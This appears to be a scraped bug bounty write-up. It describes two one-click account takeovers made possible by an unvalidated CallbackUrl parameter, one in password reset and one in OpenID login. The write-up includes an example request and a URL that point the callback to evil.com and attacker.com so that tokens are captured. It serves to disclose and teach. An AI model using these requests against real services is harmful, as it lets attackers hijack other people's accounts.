---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-05-18_how-a-single-parameter-led-to-two-ato-cases.md
original_filename: 2024-05-18_how-a-single-parameter-led-to-two-ato-cases.md
title: How a Single Parameter Led to Two ATO Cases
category: documents
detected_topics:
- password-reset
- oauth
- sso
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- password-reset
- oauth
- sso
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: c7e7efba8b639e924a64b843c168e83bd544390640adb64477f29cfe5585362b
text_sha256: b2a9f5a92ceea9bba1943e006e09d6eb04444100caff6ad3bf4d5fc67df084c0
ingested_at: '2026-06-28T07:32:33Z'
sensitivity: unknown
redactions_applied: false
---

# How a Single Parameter Led to Two ATO Cases

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-05-18_how-a-single-parameter-led-to-two-ato-cases.md
- Source Type: markdown
- Detected Topics: password-reset, oauth, sso, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:33Z
- Redactions Applied: False
- Raw SHA256: `c7e7efba8b639e924a64b843c168e83bd544390640adb64477f29cfe5585362b`
- Text SHA256: `b2a9f5a92ceea9bba1943e006e09d6eb04444100caff6ad3bf4d5fc67df084c0`


## Content

---
title: "How a Single Parameter Led to Two ATO Cases"
url: "https://cametom006.medium.com/how-a-single-parameter-led-to-two-ato-cases-c3cf2f4d00c2"
authors: ["Fahad Faisal (@cametome006)"]
bugs: ["OIDC", "Account takeover", "Password reset"]
publication_date: "2024-05-18"
added_date: "2024-07-22"
source: "pentester.land/writeups.json"
original_index: 286
scraped_via: "browseros"
---

# How a Single Parameter Led to Two ATO Cases

How a Single Parameter Led to Two ATO Cases
Fahad Faisal
Follow
3 min read
·
May 19, 2024

119

Hey guys, Today, I’m excited to share an intriguing story about how a single parameter in an application led to two account takeover cases and earned me a four-digit bounty. The program is a private one on HackerOne, and I was among the first few hackers to get invited. I’ll explain two bugs I found here. Both account takeover (ATO) cases are one-click exploits, meaning the victim only needed to perform a single interaction.

Weakness in the Password Reset Functionality

I was testing the password reset functionality of this application and discovered an interesting parameter called CallbackUrl from the password reset request.

POST /auth/resetpassword HTTP/2
Host: api.example.com
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
Origin: https://app.example.com
Referer: https://app.example.com

{"Email":"victim@example.com","CallbackUrl":"https://evil.com/auth/reset-password"}

When a user requests a password reset link, the server sends a request to the specified email with a password reset link that contains a token. However, I discovered that if an attacker changes the request parameter CallbackUrl to a domain that they control, the password reset link will be sent likeattacker.domain.com/auth/reset-password?token=token to the user's email. This means that the attacker can obtain the password reset token when the user clicks the link and use it to take over the user's account.

I reported the issues, and they marked the report as high severity and rewarded me with a $$$$ digit bounty.

This discovery sparked my curiosity to dig deeper into the platform. I searched the application JavaScript for corresponding parameters and found that the same parameter is used in the application’s 0Auth flow.

Account Takeover via Misconfigured OpenID

During my testing on the 0Auth mechanism of the application, I got another security flaw that could potentially lead to One click account takeover. This vulnerability stems from a misconfiguration in the OpenID implementation, specifically in the callbackUrl parameter used in the authentication flow with various identity providers.

Get Fahad Faisal’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I discovered that an attacker could exploit this misconfiguration by manipulating the callbackUrl parameter by redirecting it to an attacker-controlled domain, malicious actors could intercept the authentication process and potentially gain unauthorized access to user accounts.

For example:

Google: https://api.example.net/openid/google?callbackUrl=https://attacker.com/auth/register Initiating the authentication process with the respective provider results in the authentication response being redirected to the attacker's domain.

Exploiting this vulnerability allows attackers to intercept authentication responses, potentially obtaining access tokens. The authentication response is redirected to the attacker-controlled domain specified in the modified callbackUrl parameter.

After reporting the issue, the team responded by explaining that they considered the reported vulnerability as part of the previous callbackUrl fix. They emphasized that their policy only allows for one bounty payment per bug and considered duplicates unacceptable. Despite their explanation, I reiterated my findings, emphasizing that the vulnerability persisted specifically in the callbackUrl of the Auth0 endpoint. I acknowledged their efforts in resolving the previous bug but urged them to consider this as a separate issue due to its potential risk of account takeover.

Press enter or click to view image in full size

Following internal discussions, the team ultimately recognized the severity of the vulnerability and awarded me another $$$$ digit bounty along with an exclusive swag pack as a token of appreciation for bringing it to their attention.

Thanks for taking the time to read through the write-up, and stay tuned for more insights and discoveries in the future
